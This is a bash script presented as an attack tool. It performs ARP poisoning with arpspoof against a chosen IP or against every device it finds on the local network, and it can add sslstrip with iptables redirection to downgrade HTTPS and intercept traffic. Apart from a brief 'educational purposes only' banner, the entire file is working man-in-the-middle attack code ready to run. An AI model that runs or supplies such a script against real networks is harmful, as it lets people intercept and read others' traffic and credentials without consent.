#!/bin/bash

# Colors for formatting
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
NC='\033[0m' # No color

# Warning message
echo -e "${YELLOW}***************************************************************************${NC}"
echo -e "${YELLOW}*                                                                         *${NC}"
echo -e "${YELLOW}*   WARNING: This script is for educational purposes only.                *${NC}"
echo -e "${YELLOW}*   Unauthorized use is illegal and may result in severe consequences.    *${NC}"
echo -e "${YELLOW}*                                                                         *${NC}"
echo -e "${YELLOW}***************************************************************************${NC}"

# Ensure the script is run as root
if [[ $EUID -ne 0 ]]; then
    echo -e "${RED}This script must be run as root. Please use sudo.${NC}"
    exit 1
fi

# Enable IP forwarding
echo -e "${YELLOW}Enabling IP forwarding...${NC}"
echo 1 > /proc/sys/net/ipv4/ip_forward

# Cleanup function for exiting
function cleanup() {
    echo -e "${RED}\nCleaning up...${NC}"
    echo 0 > /proc/sys/net/ipv4/ip_forward
    pkill arpspoof
    pkill sslstrip
    iptables -t nat -F
    iptables -F
    iptables -X
    exit 0
}

# Trap CTRL+C to call cleanup
trap cleanup SIGINT

# Detect the router IP automatically
router=$(ip route | grep default | awk '{print $3}')

# Check if the router was detected
if [[ -z "$router" ]]; then
    echo -e "${RED}Failed to detect the router IP. Please ensure you are connected to a network.${NC}"
    exit 1
fi

# Function to select a network interface
function select_interface() {
    while true; do
        interfaces=$(ip link show | grep -E "^[0-9]+:" | awk -F': ' '{print $2}')
        echo -e "${YELLOW}Available network interfaces:${NC}"
        i=1
        for iface in $interfaces; do
            echo "$i) $iface"
            iface_list[$i]=$iface
            ((i++))
        done

        read -p "Enter the number corresponding to your network interface: " iface_choice
        selected_iface=${iface_list[$iface_choice]}
        if [[ -n "$selected_iface" ]]; then
            echo -e "${GREEN}Selected interface: $selected_iface${NC}"
            break
        else
            echo -e "${RED}Invalid choice. Please try again.${NC}"
        fi
    done
}

# Call the function to select the network interface
select_interface

# Display detected router
echo -e "${GREEN}Router detected: $router${NC}"

# Function to enable SSLStrip
function enable_sslstrip() {
    while true; do
        echo -e "${YELLOW}SSLStrip downgrades HTTPS connections to HTTP, allowing you to intercept and read secure traffic.${NC}"
        echo -e "${YELLOW}Do you want to enable SSLStrip? (yes/y or no/n):${NC}"
        read -p "" use_sslstrip
        if [[ "$use_sslstrip" =~ ^(yes|y)$ ]]; then
            echo -e "${YELLOW}Starting SSLStrip...${NC}"
            sslstrip -l 8080 &
            echo -e "${YELLOW}Configuring iptables to redirect HTTP traffic...${NC}"
            iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080
            echo -e "${GREEN}SSLStrip is running. HTTPS traffic will be downgraded to HTTP.${NC}"
            break
        elif [[ "$use_sslstrip" =~ ^(no|n)$ ]]; then
            echo -e "${GREEN}SSLStrip will not be used.${NC}"
            break
        else
            echo -e "${RED}Invalid input. Please answer with 'yes/y' or 'no/n'. Try again.${NC}"
        fi
    done
}

# Function to attack a single device
function attack_single() {
    read -p "Enter the target device's IP: " target_ip

    echo -e "${GREEN}Preparing to attack the target device...${NC}"
    
    # Ask about SSLStrip usage before starting the attack
    echo -e "${YELLOW}SSLStrip Option:${NC}"
    enable_sslstrip

    echo -e "${GREEN}Starting ARP poisoning attack on ${target_ip}...${NC}"
    echo -e "${RED}Press CTRL+C to stop the attack.${NC}"

    arpspoof -i $selected_iface -t $target_ip $router &
    arpspoof -i $selected_iface -t $router $target_ip &
    wait
}

# Function to attack the entire network dynamically
function attack_all_dynamic() {
    echo -e "${GREEN}Starting dynamic network scanning and ARP spoofing...${NC}"
    network=$(ip -o -f inet addr show $selected_iface | awk '/scope global/ {print $4}')
    IFS=. read -r i1 i2 i3 i4 <<< $(echo $network | cut -d'/' -f1)

    # Ask about SSLStrip usage before starting the attack
    echo -e "${YELLOW}SSLStrip Option:${NC}"
    enable_sslstrip

    # Use an associative array to track attacked devices
    declare -A attacked_devices

    while true; do
        # Scan the network
        for ip in $(seq 1 254); do
            target_ip="${i1}.${i2}.${i3}.${ip}"
            if ping -c 1 -W 1 $target_ip &>/dev/null; then
                if [[ -z "${attacked_devices[$target_ip]}" ]]; then
                    echo -e "${YELLOW}Discovered new device: $target_ip${NC}"
                    attacked_devices[$target_ip]=1

                    # Launch ARP spoofing attack on the new device
                    echo -e "${YELLOW}Launching ARP spoofing on $target_ip...${NC}"
                    arpspoof -i $selected_iface -t $target_ip $router &
                    arpspoof -i $selected_iface -t $router $target_ip &
                fi
            fi
        done
        sleep 60 # Pause for 1 minute before rescanning the network
    done
}

# Prompt the user to choose an attack type
while true; do
    echo "Select the type of attack:"
    echo "1) Single Device"
    echo "2) Entire Network"
    read -p "Enter your choice (1/2): " choice
    case $choice in
        1)
            attack_single
            break
            ;;
        2)
            attack_all_dynamic
            break
            ;;
        *)
            echo -e "${RED}Invalid choice. Please enter 1 or 2.${NC}"
            ;;
    esac
done
